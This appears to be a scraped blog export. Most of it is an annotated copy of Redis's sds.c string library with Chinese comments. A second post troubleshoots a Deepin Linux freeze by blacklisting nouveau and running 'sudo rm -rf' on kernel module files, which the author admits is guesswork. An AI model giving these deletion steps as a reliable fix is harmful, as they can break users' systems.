*length* of the sds string as returned * by sdslen(), but only the free buffer space we have. *//* * 对 sds 中 buf 的长度进行扩展，确保在函数执行之后， * buf 至少会有 addlen + 1 长度的空余空间 * （额外的 1 字节是为 \\0 准备的） * * 返回值 * sds ：扩展成功返回扩展后的 sds * 扩展失败返回 NULL * * 复杂度 * T = O(N) */sds sdsMakeRoomFor(sds s, size_t addlen) &#123; struct sdshdr *sh, *newsh; // 获取 s 目前的空余空间长度 size_t free = sdsavail(s); size_t len, newlen; // s 目前的空余空间已经足够，无须再进行扩展，直接返回 if (free &gt;= addlen) return s; // 获取 s 目前已占用空间的长度 len = sdslen(s); sh = (void*) (s-(sizeof(struct sdshdr))); // s 最少需要的长度 newlen = (len+addlen); // 根据新长度，为 s 分配新空间所需的大小 if (newlen &lt; SDS_MAX_PREALLOC) // 如果新长度小于 SDS_MAX_PREALLOC // 那么为它分配两倍于所需长度的空间 newlen *= 2; else // 否则，分配长度为目前长度加上 SDS_MAX_PREALLOC newlen += SDS_MAX_PREALLOC; // T = O(N) newsh = zrealloc(sh, sizeof(struct sdshdr)+newlen+1); // 内存不足，分配失败，返回 if (newsh == NULL) return NULL; // 更新 sds 的空余长度 newsh-&gt;free = newlen - len; // 返回 sds return newsh-&gt;buf;&#125;/* * 回收 sds 中的空闲空间， * 回收不会对 sds 中保存的字符串内容做任何修改。 * * 返回值 * sds ：内存调整后的 sds * * 复杂度 * T = O(N) *//* Reallocate the sds string so that it has no free space at the end. The * contained string remains not altered, but next concatenation operations * will require a reallocation. * * After the call, the passed sds string is no longer valid and all the * references must be substituted with the new pointer returned by the call. */sds sdsRemoveFreeSpace(sds s) &#123; struct sdshdr *sh; sh = (void*) (s-(sizeof(struct sdshdr))); // 进行内存重分配，让 buf 的长度仅仅足够保存字符串内容 // T = O(N) sh = zrealloc(sh, sizeof(struct sdshdr)+sh-&gt;len+1); // 空余空间为 0 sh-&gt;free = 0; return sh-&gt;buf;&#125;/* * 返回给定 sds 分配的内存字节数 * * 复杂度 * T = O(1) *//* Return the total size of the allocation of the specifed sds string, * including: * 1) The sds header before the pointer. * 2) The string. * 3) The free buffer at the end if any. * 4) The implicit null term. */size_t sdsAllocSize(sds s) &#123; struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); return sizeof(*sh)+sh-&gt;len+sh-&gt;free+1;&#125;/* Increment the sds length and decrements the left free space at the * end of the string according to 'incr'. Also set the null term * in the new end of the string. * * 根据 incr 参数，增加 sds 的长度，缩减空余空间， * 并将 \\0 放到新字符串的尾端 * * This function is used in order to fix the string length after the * user calls sdsMakeRoomFor(), writes something after the end of * the current string, and finally needs to set the new length. * * 这个函数是在调用 sdsMakeRoomFor() 对字符串进行扩展， * 然后用户在字符串尾部写入了某些内容之后， * 用来正确更新 free 和 len 属性的。 * * Note: it is possible to use a negative increment in order to * right-trim the string. * * 如果 incr 参数为负数，那么对字符串进行右截断操作。 * * Usage example: * * Using sdsIncrLen() and sdsMakeRoomFor() it is possible to mount the * following schema, to cat bytes coming from the kernel to the end of an * sds string without copying into an intermediate buffer: * * 以下是 sdsIncrLen 的用例： * * oldlen = sdslen(s); * s = sdsMakeRoomFor(s, BUFFER_SIZE); * nread = read(fd, s+oldlen, BUFFER_SIZE); * ... check for nread &lt;= 0 and handle it ... * sdsIncrLen(s, nread); * * 复杂度 * T = O(1) */void sdsIncrLen(sds s, int incr) &#123; struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); // 确保 sds 空间足够 assert(sh-&gt;free &gt;= incr); // 更新属性 sh-&gt;len += incr; sh-&gt;free -= incr; // 这个 assert 其实可以忽略 // 因为前一个 assert 已经确保 sh-&gt;free - incr &gt;= 0 了 assert(sh-&gt;free &gt;= 0); // 放置新的结尾符号 s[sh-&gt;len] = '\\0';&#125;/* Grow the sds to have the specified length. Bytes that were not part of * the original length of the sds will be set to zero. * * if the specified length is smaller than the current length, no operation * is performed. *//* * 将 sds 扩充至指定长度，未使用的空间以 0 字节填充。 * * 返回值 * sds ：扩充成功返回新 sds ，失败返回 NULL * * 复杂度： * T = O(N) */sds sdsgrowzero(sds s, size_t len) &#123; struct sdshdr *sh = (void*)(s-(sizeof(struct sdshdr))); size_t totlen, curlen = sh-&gt;len; // 如果 len 比字符串的现有长度小， // 那么直接返回，不做动作 if (len &lt;= curlen) return s; // 扩展 sds // T = O(N) s = sdsMakeRoomFor(s,len-curlen); // 如果内存不足，直接返回 if (s == NULL) return NULL; /* Make sure added region doesn't contain garbage */ // 将新分配的空间用 0 填充，防止出现垃圾内容 // T = O(N) sh = (void*)(s-(sizeof(struct sdshdr))); memset(s+curlen,0,(len-curlen+1)); /* also set trailing \\0 byte */ // 更新属性 totlen = sh-&gt;len+sh-&gt;free; sh-&gt;len = len; sh-&gt;free = totlen-sh-&gt;len; // 返回新的 sds return s;&#125;/* * 将长度为 len 的字符串 t 追加到 sds 的字符串末尾 * * 返回值 * sds ：追加成功返回新 sds ，失败返回 NULL * * 复杂度 * T = O(N) *//* Append the specified binary-safe string pointed by 't' of 'len' bytes to the * end of the specified sds string 's'. * * After the call, the passed sds string is no longer valid and all the * references must be substituted with the new pointer returned by the call. */sds sdscatlen(sds s, const void *t, size_t len) &#123; struct sdshdr *sh; // 原有字符串长度 size_t curlen = sdslen(s); // 扩展 sds 空间 // T = O(N) s = sdsMakeRoomFor(s,len); // 内存不足？直接返回 if (s == NULL) return NULL; // 复制 t 中的内容到字符串后部 // T = O(N) sh = (void*) (s-(sizeof(struct sdshdr))); memcpy(s+curlen, t, len); // 更新属性 sh-&gt;len = curlen+len; sh-&gt;free = sh-&gt;free-len; // 添加新结尾符号 s[curlen+len] = '\\0'; // 返回新 sds return s;&#125;/* * 将给定字符串 t 追加到 sds 的末尾 * * 返回值 * sds ：追加成功返回新 sds ，失败返回 NULL * * 复杂度 * T = O(N) *//* Append the specified null termianted C string to the sds string 's'. * * After the call, the passed sds string is no longer valid and all the * references must be substituted with the new pointer returned by the call. */sds sdscat(sds s, const char *t) &#123; return sdscatlen(s, t, strlen(t));&#125;/* * 将另一个 sds 追加到一个 sds 的末尾 * * 返回值 * sds ：追加成功返回新 sds ，失败返回 NULL * * 复杂度 * T = O(N) *//* Append the specified sds 't' to the existing sds 's'. * * After the call, the modified sds string is no longer valid and all the * references must be substituted with the new pointer returned by the call. */sds sdscatsds(sds s, const sds t) &#123; return sdscatlen(s, t, sdslen(t));&#125;/* * 将字符串 t 的前 len 个字符复制到 sds s 当中， * 并在字符串的最后添加终结符。 * * 如果 sds 的长度少于 len 个字符，那么扩展 sds * * 复杂度 * T = O(N) * * 返回值 * sds ：复制成功返回新的 sds ，否则返回 NULL *//* Destructively modify the sds string 's' to hold the specified binary * safe string pointed by 't' of length 'len' bytes. */sds sdscpylen(sds s, const char *t, size_t len) &#123; struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); // sds 现有 buf 的长度 size_t totlen = sh-&gt;free+sh-&gt;len; // 如果 s 的 buf 长度不满足 len ，那么扩展它 if (totlen &lt; len) &#123; // T = O(N) s = sdsMakeRoomFor(s,len-sh-&gt;len); if (s == NULL) return NULL; sh = (void*) (s-(sizeof(struct sdshdr))); totlen = sh-&gt;free+sh-&gt;len; &#125; // 复制内容 // T = O(N) memcpy(s, t, len); // 添加终结符号 s[len] = '\\0'; // 更新属性 sh-&gt;len = len; sh-&gt;free = totlen-len; // 返回新的 sds return s;&#125;/* * 将字符串复制到 sds 当中， * 覆盖原有的字符。 * * 如果 sds 的长度少于字符串的长度，那么扩展 sds 。 * * 复杂度 * T = O(N) * * 返回值 * sds ：复制成功返回新的 sds ，否则返回 NULL *//* Like sdscpylen() but 't' must be a null-termined string so that the length * of the string is obtained with strlen(). */sds sdscpy(sds s, const char *t) &#123; return sdscpylen(s, t, strlen(t));&#125;/* Helper for sdscatlonglong() doing the actual number -&gt; string * conversion. 's' must point to a string with room for at least * SDS_LLSTR_SIZE bytes. * * The function returns the lenght of the null-terminated string * representation stored at 's'. */#define SDS_LLSTR_SIZE 21int sdsll2str(char *s, long long value) &#123; char *p, aux; unsigned long long v; size_t l; /* Generate the string representation, this method produces * an reversed string. */ v = (value &lt; 0) ? -value : value; p = s; do &#123; *p++ = '0'+(v%10); v /= 10; &#125; while(v); if (value &lt; 0) *p++ = '-'; /* Compute length and add null term. */ l = p-s; *p = '\\0'; /* Reverse the string. */ p--; while(s &lt; p) &#123; aux = *s; *s = *p; *p = aux; s++; p--; &#125; return l;&#125;/* Identical sdsll2str(), but for unsigned long long type. */int sdsull2str(char *s, unsigned long long v) &#123; char *p, aux; size_t l; /* Generate the string representation, this method produces * an reversed string. */ p = s; do &#123; *p++ = '0'+(v%10); v /= 10; &#125; while(v); /* Compute length and add null term. */ l = p-s; *p = '\\0'; /* Reverse the string. */ p--; while(s &lt; p) &#123; aux = *s; *s = *p; *p = aux; s++; p--; &#125; return l;&#125;/* Create an sds string from a long long value. It is much faster than: * * sdscatprintf(sdsempty(),\"%lld\\n\", value); */// 根据输入的 long long 值 value ，创建一个 SDSsds sdsfromlonglong(long long value) &#123; char buf[SDS_LLSTR_SIZE]; int len = sdsll2str(buf,value); return sdsnewlen(buf,len);&#125;/* * 打印函数，被 sdscatprintf 所调用 * * T = O(N^2) *//* Like sdscatpritf() but gets va_list instead of being variadic. */sds sdscatvprintf(sds s, const char *fmt, va_list ap) &#123; va_list cpy; char staticbuf[1024], *buf = staticbuf, *t; size_t buflen = strlen(fmt)*2; /* We try to start using a static buffer for speed. * If not possible we revert to heap allocation. */ if (buflen &gt; sizeof(staticbuf)) &#123; buf = zmalloc(buflen); if (buf == NULL) return NULL; &#125; else &#123; buflen = sizeof(staticbuf); &#125; /* Try with buffers two times bigger every time we fail to * fit the string in the current buffer size. */ while(1) &#123; buf[buflen-2] = '\\0'; va_copy(cpy,ap); // T = O(N) vsnprintf(buf, buflen, fmt, cpy); if (buf[buflen-2] != '\\0') &#123; if (buf != staticbuf) zfree(buf); buflen *= 2; buf = zmalloc(buflen); if (buf == NULL) return NULL; continue; &#125; break; &#125; /* Finally concat the obtained string to the SDS string and return it. */ t = sdscat(s, buf); if (buf != staticbuf) zfree(buf); return t;&#125;/* * 打印任意数量个字符串，并将这些字符串追加到给定 sds 的末尾 * * T = O(N^2) *//* Append to the sds string 's' a string obtained using printf-alike format * specifier. * * After the call, the modified sds string is no longer valid and all the * references must be substituted with the new pointer returned by the call. * * Example: * * s = sdsempty(\"Sum is: \"); * s = sdscatprintf(s,\"%d+%d = %d\",a,b,a+b). * * Often you need to create a string from scratch with the printf-alike * format. When this is the need, just use sdsempty() as the target string: * * s = sdscatprintf(sdsempty(), \"... your format ...\", args); */sds sdscatprintf(sds s, const char *fmt, ...) &#123; va_list ap; char *t; va_start(ap, fmt); // T = O(N^2) t = sdscatvprintf(s,fmt,ap); va_end(ap); return t;&#125;/* This function is similar to sdscatprintf, but much faster as it does * not rely on sprintf() family functions implemented by the libc that * are often very slow. Moreover directly handling the sds string as * new data is concatenated provides a performance improvement. * * However this function only handles an incompatible subset of printf-alike * format specifiers: * * %s - C String * %S - SDS string * %i - signed int * %I - 64 bit signed integer (long long, int64_t) * %u - unsigned int * %U - 64 bit unsigned integer (unsigned long long, uint64_t) * %% - Verbatim \"%\" character. */sds sdscatfmt(sds s, char const *fmt, ...) &#123; struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); size_t initlen = sdslen(s); const char *f = fmt; int i; va_list ap; va_start(ap,fmt); f = fmt; /* Next format specifier byte to process. */ i = initlen; /* Position of the next byte to write to dest str. */ while(*f) &#123; char next, *str; size_t l; long long num; unsigned long long unum; /* Make sure there is always space for at least 1 char. */ if (sh-&gt;free == 0) &#123; s = sdsMakeRoomFor(s,1); sh = (void*) (s-(sizeof(struct sdshdr))); &#125; switch(*f) &#123; case '%': next = *(f+1); f++; switch(next) &#123; case 's': case 'S': str = va_arg(ap,char*); l = (next == 's') ? strlen(str) : sdslen(str); if (sh-&gt;free &lt; l) &#123; s = sdsMakeRoomFor(s,l); sh = (void*) (s-(sizeof(struct sdshdr))); &#125; memcpy(s+i,str,l); sh-&gt;len += l; sh-&gt;free -= l; i += l; break; case 'i': case 'I': if (next == 'i') num = va_arg(ap,int); else num = va_arg(ap,long long); &#123; char buf[SDS_LLSTR_SIZE]; l = sdsll2str(buf,num); if (sh-&gt;free &lt; l) &#123; s = sdsMakeRoomFor(s,l); sh = (void*) (s-(sizeof(struct sdshdr))); &#125; memcpy(s+i,buf,l); sh-&gt;len += l; sh-&gt;free -= l; i += l; &#125; break; case 'u': case 'U': if (next == 'u') unum = va_arg(ap,unsigned int); else unum = va_arg(ap,unsigned long long); &#123; char buf[SDS_LLSTR_SIZE]; l = sdsull2str(buf,unum); if (sh-&gt;free &lt; l) &#123; s = sdsMakeRoomFor(s,l); sh = (void*) (s-(sizeof(struct sdshdr))); &#125; memcpy(s+i,buf,l); sh-&gt;len += l; sh-&gt;free -= l; i += l; &#125; break; default: /* Handle %% and generally %&lt;unknown&gt;. */ s[i++] = next; sh-&gt;len += 1; sh-&gt;free -= 1; break; &#125; break; default: s[i++] = *f; sh-&gt;len += 1; sh-&gt;free -= 1; break; &#125; f++; &#125; va_end(ap); /* Add null-term */ s[i] = '\\0'; return s;&#125;/* * 对 sds 左右两端进行修剪，清除其中 cset 指定的所有字符 * * 比如 sdsstrim(xxyyabcyyxy, \"xy\") 将返回 \"abc\" * * 复杂性： * T = O(M*N)，M 为 SDS 长度， N 为 cset 长度。 *//* Remove the part of the string from left and from right composed just of * contiguous characters found in 'cset', that is a null terminted C string. * * After the call, the modified sds string is no longer valid and all the * references must be substituted with the new pointer returned by the call. * * Example: * * s = sdsnew(\"AA...AA.a.aa.aHelloWorld :::\"); * s = sdstrim(s,\"A. :\"); * printf(\"%s\\n\", s); * * Output will be just \"Hello World\". */sds sdstrim(sds s, const char *cset) &#123; struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); char *start, *end, *sp, *ep; size_t len; // 设置和记录指针 sp = start = s; ep = end = s+sdslen(s)-1; // 修剪, T = O(N^2) while(sp &lt;= end &amp;&amp; strchr(cset, *sp)) sp++; while(ep &gt; start &amp;&amp; strchr(cset, *ep)) ep--; // 计算 trim 完毕之后剩余的字符串长度 len = (sp &gt; ep) ? 0 : ((ep-sp)+1); // 如果有需要，前移字符串内容 // T = O(N) if (sh-&gt;buf != sp) memmove(sh-&gt;buf, sp, len); // 添加终结符 sh-&gt;buf[len] = '\\0'; // 更新属性 sh-&gt;free = sh-&gt;free+(sh-&gt;len-len); sh-&gt;len = len; // 返回修剪后的 sds return s;&#125;/* * 按索引对截取 sds 字符串的其中一段 * start 和 end 都是闭区间（包含在内） * * 索引从 0 开始，最大为 sdslen(s) - 1 * 索引可以是负数， sdslen(s) - 1 == -1 * * 复杂度 * T = O(N) *//* Turn the string into a smaller (or equal) string containing only the * substring specified by the 'start' and 'end' indexes. * * start and end can be negative, where -1 means the last character of the * string, -2 the penultimate character, and so forth. * * The interval is inclusive, so the start and end characters will be part * of the resulting string. * * The string is modified in-place. * * Example: * * s = sdsnew(\"Hello World\"); * sdsrange(s,1,-1); =&gt; \"ello World\" */void sdsrange(sds s, int start, int end) &#123; struct sdshdr *sh = (void*) (s-(sizeof(struct sdshdr))); size_t newlen, len = sdslen(s); if (len == 0) return; if (start &lt; 0) &#123; start = len+start; if (start &lt; 0) start = 0; &#125; if (end &lt; 0) &#123; end = len+end; if (end &lt; 0) end = 0; &#125; newlen = (start &gt; end) ? 0 : (end-start)+1; if (newlen != 0) &#123; if (start &gt;= (signed)len) &#123; newlen = 0; &#125; else if (end &gt;= (signed)len) &#123; end = len-1; newlen = (start &gt; end) ? 0 : (end-start)+1; &#125; &#125; else &#123; start = 0; &#125; // 如果有需要，对字符串进行移动 // T = O(N) if (start &amp;&amp; newlen) memmove(sh-&gt;buf, sh-&gt;buf+start, newlen); // 添加终结符 sh-&gt;buf[newlen] = 0; // 更新属性 sh-&gt;free = sh-&gt;free+(sh-&gt;len-newlen); sh-&gt;len = newlen;&#125;/* * 将 sds 字符串中的所有字符转换为小写 * * T = O(N) *//* Apply tolower() to every character of the sds string 's'. */void sdstolower(sds s) &#123; int len = sdslen(s), j; for (j = 0; j &lt; len; j++) s[j] = tolower(s[j]);&#125;/* * 将 sds 字符串中的所有字符转换为大写 * * T = O(N) *//* Apply toupper() to every character of the sds string 's'. */void sdstoupper(sds s) &#123; int len = sdslen(s), j; for (j = 0; j &lt; len; j++) s[j] = toupper(s[j]);&#125;/* * 对比两个 sds ， strcmp 的 sds 版本 * * 返回值 * int ：相等返回 0 ，s1 较大返回正数， s2 较大返回负数 * * T = O(N) *//* Compare two sds strings s1 and s2 with memcmp(). * * Return value: * * 1 if s1 &gt; s2. * -1 if s1 &lt; s2. * 0 if s1 and s2 are exactly the same binary string. * * If two strings share exactly the same prefix, but one of the two has * additional characters, the longer string is considered to be greater than * the smaller one. */int sdscmp(const sds s1, const sds s2) &#123; size_t l1, l2, minlen; int cmp; l1 = sdslen(s1); l2 = sdslen(s2); minlen = (l1 &lt; l2) ? l1 : l2; cmp = memcmp(s1,s2,minlen); if (cmp == 0) return l1-l2; return cmp;&#125;/* Split 's' with separator in 'sep'. An array * of sds strings is returned. *count will be set * by reference to the number of tokens returned. * * 使用分隔符 sep 对 s 进行分割，返回一个 sds 字符串的数组。 * *count 会被设置为返回数组元素的数量。 * * On out of memory, zero length string, zero length * separator, NULL is returned. * * 如果出现内存不足、字符串长度为 0 或分隔符长度为 0 * 的情况，返回 NULL * * Note that 'sep' is able to split a string using * a multi-character separator. For example * sdssplit(\"foo_-_bar\",\"_-_\"); will return two * elements \"foo\" and \"bar\". * * 注意分隔符可以的是包含多个字符的字符串 * * This version of the function is binary-safe but * requires length arguments. sdssplit() is just the * same function but for zero-terminated strings. * * 这个函数接受 len 参数，因此它是二进制安全的。 * （文档中提到的 sdssplit() 已废弃） * * T = O(N^2) */sds *sdssplitlen(const char *s, int len, const char *sep, int seplen, int *count) &#123; int elements = 0, slots = 5, start = 0, j; sds *tokens; if (seplen &lt; 1 || len &lt; 0) return NULL; tokens = zmalloc(sizeof(sds)*slots); if (tokens == NULL) return NULL; if (len == 0) &#123; *count = 0; return tokens; &#125; // T = O(N^2) for (j = 0; j &lt; (len-(seplen-1)); j++) &#123; /* make sure there is room for the next element and the final one */ if (slots &lt; elements+2) &#123; sds *newtokens; slots *= 2; newtokens = zrealloc(tokens,sizeof(sds)*slots); if (newtokens == NULL) goto cleanup; tokens = newtokens; &#125; /* search the separator */ // T = O(N) if ((seplen == 1 &amp;&amp; *(s+j) == sep[0]) || (memcmp(s+j,sep,seplen) == 0)) &#123; tokens[elements] = sdsnewlen(s+start,j-start); if (tokens[elements] == NULL) goto cleanup; elements++; start = j+seplen; j = j+seplen-1; /* skip the separator */ &#125; &#125; /* Add the final element. We are sure there is room in the tokens array. */ tokens[elements] = sdsnewlen(s+start,len-start); if (tokens[elements] == NULL) goto cleanup; elements++; *count = elements; return tokens;cleanup: &#123; int i; for (i = 0; i &lt; elements; i++) sdsfree(tokens[i]); zfree(tokens); *count = 0; return NULL; &#125;&#125;/* * 释放 tokens 数组中 count 个 sds * * T = O(N^2) *//* Free the result returned by sdssplitlen(), or do nothing if 'tokens' is NULL. */void sdsfreesplitres(sds *tokens, int count) &#123; if (!tokens) return; while(count--) sdsfree(tokens[count]); zfree(tokens);&#125;/* * 将长度为 len 的字符串 p 以带引号（quoted）的格式 * 追加到给定 sds 的末尾 * * T = O(N) *//* Append to the sds string \"s\" an escaped string representation where * all the non-printable characters (tested with isprint()) are turned into * escapes in the form \"\\n\\r\\a....\" or \"\\x&lt;hex-number&gt;\". * * After the call, the modified sds string is no longer valid and all the * references must be substituted with the new pointer returned by the call. */sds sdscatrepr(sds s, const char *p, size_t len) &#123; s = sdscatlen(s,\"\\\"\",1); while(len--) &#123; switch(*p) &#123; case '\\\\': case '\"': s = sdscatprintf(s,\"\\\\%c\",*p); break; case '\\n': s = sdscatlen(s,\"\\\\n\",2); break; case '\\r': s = sdscatlen(s,\"\\\\r\",2); break; case '\\t': s = sdscatlen(s,\"\\\\t\",2); break; case '\\a': s = sdscatlen(s,\"\\\\a\",2); break; case '\\b': s = sdscatlen(s,\"\\\\b\",2); break; default: if (isprint(*p)) s = sdscatprintf(s,\"%c\",*p); else s = sdscatprintf(s,\"\\\\x%02x\",(unsigned char)*p); break; &#125; p++; &#125; return sdscatlen(s,\"\\\"\",1);&#125;/* Helper function for sdssplitargs() that returns non zero if 'c' * is a valid hex digit. *//* * 如果 c 为十六进制符号的其中一个，返回正数 * * T = O(1) */int is_hex_digit(char c) &#123; return (c &gt;= '0' &amp;&amp; c &lt;= '9') || (c &gt;= 'a' &amp;&amp; c &lt;= 'f') || (c &gt;= 'A' &amp;&amp; c &lt;= 'F');&#125;/* Helper function for sdssplitargs() that converts a hex digit into an * integer from 0 to 15 *//* * 将十六进制符号转换为 10 进制 * * T = O(1) */int hex_digit_to_int(char c) &#123; switch(c) &#123; case '0': return 0; case '1': return 1; case '2': return 2; case '3': return 3; case '4': return 4; case '5': return 5; case '6': return 6; case '7': return 7; case '8': return 8; case '9': return 9; case 'a': case 'A': return 10; case 'b': case 'B': return 11; case 'c': case 'C': return 12; case 'd': case 'D': return 13; case 'e': case 'E': return 14; case 'f': case 'F': return 15; default: return 0; &#125;&#125;/* Split a line into arguments, where every argument can be in the * following programming-language REPL-alike form: * * 将一行文本分割成多个参数，每个参数可以有以下的类编程语言 REPL 格式： * * foo bar \"newline are supported\\n\" and \"\\xff\\x00otherstuff\" * * The number of arguments is stored into *argc, and an array * of sds is returned. * * 参数的个数会保存在 *argc 中，函数返回一个 sds 数组。 * * The caller should free the resulting array of sds strings with * sdsfreesplitres(). * * 调用者应该使用 sdsfreesplitres() 来释放函数返回的 sds 数组。 * * Note that sdscatrepr() is able to convert back a string into * a quoted string in the same format sdssplitargs() is able to parse. * * sdscatrepr() 可以将一个字符串转换为一个带引号（quoted）的字符串， * 这个带引号的字符串可以被 sdssplitargs() 分析。 * * The function returns the allocated tokens on success, even when the * input string is empty, or NULL if the input contains unbalanced * quotes or closed quotes followed by non space characters * as in: \"foo\"bar or \"foo' * * 即使输入出现空字符串， NULL ，或者输入带有未对应的括号， * 函数都会将已成功处理的字符串先返回。 * * 这个函数主要用于 config.c 中对配置文件进行分析。 * 例子： * sds *arr = sdssplitargs(\"timeout 10086\\r\\nport 123321\\r\\n\"); * 会得出 * arr[0] = \"timeout\" * arr[1] = \"10086\" * arr[2] = \"port\" * arr[3] = \"123321\" * * T = O(N^2) */sds *sdssplitargs(const char *line, int *argc) &#123; const char *p = line; char *current = NULL; char **vector = NULL; *argc = 0; while(1) &#123; /* skip blanks */ // 跳过空白 // T = O(N) while(*p &amp;&amp; isspace(*p)) p++; if (*p) &#123; /* get a token */ int inq=0; /* set to 1 if we are in \"quotes\" */ int insq=0; /* set to 1 if we are in 'single quotes' */ int done=0; if (current == NULL) current = sdsempty(); // T = O(N) while(!done) &#123; if (inq) &#123; if (*p == '\\\\' &amp;&amp; *(p+1) == 'x' &amp;&amp; is_hex_digit(*(p+2)) &amp;&amp; is_hex_digit(*(p+3))) &#123; unsigned char byte; byte = (hex_digit_to_int(*(p+2))*16)+ hex_digit_to_int(*(p+3)); current = sdscatlen(current,(char*)&amp;byte,1); p += 3; &#125; else if (*p == '\\\\' &amp;&amp; *(p+1)) &#123; char c; p++; switch(*p) &#123; case 'n': c = '\\n'; break; case 'r': c = '\\r'; break; case 't': c = '\\t'; break; case 'b': c = '\\b'; break; case 'a': c = '\\a'; break; default: c = *p; break; &#125; current = sdscatlen(current,&amp;c,1); &#125; else if (*p == '\"') &#123; /* closing quote must be followed by a space or * nothing at all. */ if (*(p+1) &amp;&amp; !isspace(*(p+1))) goto err; done=1; &#125; else if (!*p) &#123; /* unterminated quotes */ goto err; &#125; else &#123; current = sdscatlen(current,p,1); &#125; &#125; else if (insq) &#123; if (*p == '\\\\' &amp;&amp; *(p+1) == '\\'') &#123; p++; current = sdscatlen(current,\"'\",1); &#125; else if (*p == '\\'') &#123; /* closing quote must be followed by a space or * nothing at all. */ if (*(p+1) &amp;&amp; !isspace(*(p+1))) goto err; done=1; &#125; else if (!*p) &#123; /* unterminated quotes */ goto err; &#125; else &#123; current = sdscatlen(current,p,1); &#125; &#125; else &#123; switch(*p) &#123; case ' ': case '\\n': case '\\r': case '\\t': case '\\0': done=1; break; case '\"': inq=1; break; case '\\'': insq=1; break; default: current = sdscatlen(current,p,1); break; &#125; &#125; if (*p) p++; &#125; /* add the token to the vector */ // T = O(N) vector = zrealloc(vector,((*argc)+1)*sizeof(char*)); vector[*argc] = current; (*argc)++; current = NULL; &#125; else &#123; /* Even on empty input string return something not NULL. */ if (vector == NULL) vector = zmalloc(sizeof(void*)); return vector; &#125; &#125;err: while((*argc)--) sdsfree(vector[*argc]); zfree(vector); if (current) sdsfree(current); *argc = 0; return NULL;&#125;/* Modify the string substituting all the occurrences of the set of * characters specified in the 'from' string to the corresponding character * in the 'to' array. * * 将字符串 s 中， * 所有在 from 中出现的字符，替换成 to 中的字符 * * For instance: sdsmapchars(mystring, \"ho\", \"01\", 2) * will have the effect of turning the string \"hello\" into \"0ell1\". * * 比如调用 sdsmapchars(mystring, \"ho\", \"01\", 2) * 就会将 \"hello\" 转换为 \"0ell1\" * * The function returns the sds string pointer, that is always the same * as the input pointer since no resize is needed. * 因为无须对 sds 进行大小调整， * 所以返回的 sds 输入的 sds 一样 * * T = O(N^2) */sds sdsmapchars(sds s, const char *from, const char *to, size_t setlen) &#123; size_t j, i, l = sdslen(s); // 遍历输入字符串 for (j = 0; j &lt; l; j++) &#123; // 遍历映射 for (i = 0; i &lt; setlen; i++) &#123; // 替换字符串 if (s[j] == from[i]) &#123; s[j] = to[i]; break; &#125; &#125; &#125; return s;&#125;/* Join an array of C strings using the specified separator (also a C string). * Returns the result as an sds string. */sds sdsjoin(char **argv, int argc, char *sep) &#123; sds join = sdsempty(); int j; for (j = 0; j &lt; argc; j++) &#123; join = sdscat(join, argv[j]); if (j != argc-1) join = sdscat(join,sep); &#125; return join;&#125;","path":"2019/04/15/redis源码-sds/","date":"04-15","excerpt":"SDS-动态字符串定义SDS定义于sds.h/sds.c文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/* * 这个版本中， 不同的字符串长度使用的都是同一个结构体， * 这样会造成一定的内存浪费 * version 3.0 */ struct sdshdr &#123; // 字符串的长度 unsigned int len; // 记录buf中未使用字节的数量 unsigned int free; // 字节数组，用于保存字符串 char buf[];&#125;;/* * 提供五种header定义，满足各种字符串大小 * len：字符串的长度 * alloc：字符串最大容量 * flags：标记header的类型 * buf： 字节数组，用于保存字符串 * version 5.0 */typedef char *sds;/* Note: sdshdr5 is never used, we just access the flags byte directly. * However is here to document the layout of type 5 SDS strings. */struct __attribute__ ((__packed__)) sdshdr5 &#123; unsigned char flags; /* 3 lsb of type, and 5 msb of string length */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr8 &#123; uint8_t len; /* used */ uint8_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr16 &#123; uint16_t len; /* used */ uint16_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr32 &#123; uint32_t len; /* used */ uint32_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;;struct __attribute__ ((__packed__)) sdshdr64 &#123; uint64_t len; /* used */ uint64_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;;","tags":[{"name":"源码","slug":"源码","permalink":"https://jijiking51.cn/tags/源码/"}],"preview":"http://img.jijiking51.cn/redis%E5%8E%9F%E7%A0%81_sds.jpg"},{"title":"deepin开机后假死","text":"思路参考：https://blog.csdn.net/fdqw_sph/article/details/78759529首先，我的电脑是显卡和Linux不兼容（多种版本Linux，例如：manjaro三个版本均无法使用，Ubuntu除17.10之外均无法使用——17.10还无法正常关机，需要手动关闭所有软件才可以关机，deepin开机登陆后假死，dock无反应，单cpu飙升100，kill不掉那个100%的进程） 今天折腾了一下黑苹果无果，然后回来试试deepin 看了很多官方论坛后肯定了我的显卡问题（其实主要是主板LZ，无法禁用独显） 知道原因了就问了Google 发现了上面这个大佬的帖子， 话不多说： 1.下载对应的显卡驱动https://www.geforce.cn/drivers 2.（最关键的地方） 1lsmod | grep nouveau 如果有输出则代表nouveau正在加载。则需要禁用nouveau，在/etc/modprobe.d中创建文件blacklist-nouveau.conf，再用getid打开 123cd /etc/modprobe.d/etc/modprobe.d$ sudo touch blacklist-nouveau.confsudo gedit blacklist-nouveau.conf 在文件中输入以下内容并保存： 12blacklist nouveau options nouveau modeset=0 然后更新 1sudo update-initramfs -u 这种方式也可能不能彻底禁用nouveau，在此基础上可以移除以下文件：nouveau.ko；nouveau.ko.org，此文件一般是隐藏的具体操作 123456789101112131415cd /lib/modules/4.14.0-deepin2-amd64/kernel/drivers/gpu/drm/nouveau sudo rm -rf nouveau.ko sudo rm -rf nouveau.ko.org/* * 我这里有两个选项在 &gt; /lib/modules$ ls &gt; 4.14.0-deepin2-amd64 4.9.0-deepin13-amd64 * 注意，我也不知道要删除哪个才管用，只好两个的都删除了 * /cd /lib/modules/4.9.0-deepin13-amd64/kernel/drivers/gpu/drm/nouveau sudo rm -rf nouveau.ko sudo rm -rf nouveau.ko.org 继续更新下 1sudo update-initramfs –u 